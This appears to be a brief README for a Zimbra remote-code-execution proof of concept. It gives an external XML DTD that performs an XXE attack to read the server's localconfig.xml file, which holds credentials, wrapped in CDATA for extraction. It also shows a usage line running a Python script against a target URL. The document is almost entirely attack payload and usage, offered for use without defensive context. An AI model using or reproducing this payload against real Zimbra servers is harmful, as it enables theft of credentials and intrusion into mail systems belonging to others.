###Zimbra_RCE POC

demo.dtd
```xml
<!ENTITY % file SYSTEM "file:../conf/localconfig.xml">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">
``` 
useage:
python Zimbra_Rce.py https://target.com
